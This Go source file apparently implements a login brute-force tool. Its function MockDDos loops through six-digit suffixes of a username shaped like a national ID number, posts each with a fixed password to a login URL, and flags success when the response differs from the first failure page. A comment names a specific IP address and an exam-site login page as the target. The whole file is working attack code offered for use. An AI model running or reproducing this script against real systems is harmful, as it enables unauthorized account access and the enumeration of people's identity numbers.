package util

import (
	"bytes"

	"fmt"

	"io/ioutil"

	"net/http"

	"os"

	"strconv"

	"strings"

	"github.com/op/go-logging"
)

var logger = logging.MustGetLogger("evil")

var Err []byte

func init() {

	format := logging.MustStringFormatter(`[%{module}] %{time:2006-01-02 15:04:05} [%{level}] [%{longpkg} %{shortfile}] { %{message} }`)

	backendConsole := logging.NewLogBackend(os.Stderr, "", 0)

	backendConsole2Formatter := logging.NewBackendFormatter(backendConsole, format)

	logging.SetBackend(backendConsole2Formatter)

}

func MockDDos(url string) {

	for i := 200000; i < 320000; /*000000*/ i++ {

		nonce := strconv.Itoa(i)

		if len(nonce) != 6 {

			loop := 6 - len(nonce)

			for k := 0; k < loop; k++ {

				nonce = fmt.Sprint("0", nonce)

			}

		}

		logger.Info(">>>>>>>>>>> ", nonce)

		//"http://222.132.30.219:8203/kaoshi/login.asp"
		resp, err := http.Post(url, "", strings.NewReader(fmt.Sprint("username=370785198703", nonce, "&password=111009")))

		if err != nil {

			logger.Error(err)

			continue

		}

		logger.Info(resp.StatusCode, resp.StatusCode)

		body, err := ioutil.ReadAll(resp.Body)

		if err != nil {

			logger.Error(err)

			continue

		}

		if i == 200000 {

			Err = body[:2000]

			logger.Info(string(Err))

			continue

		}

		if bytes.Equal(body[:2000], Err) {

			logger.Info("error")

			continue

		}

		logger.Info(string(body))

		break

	}

	logger.Warning("not found")

}
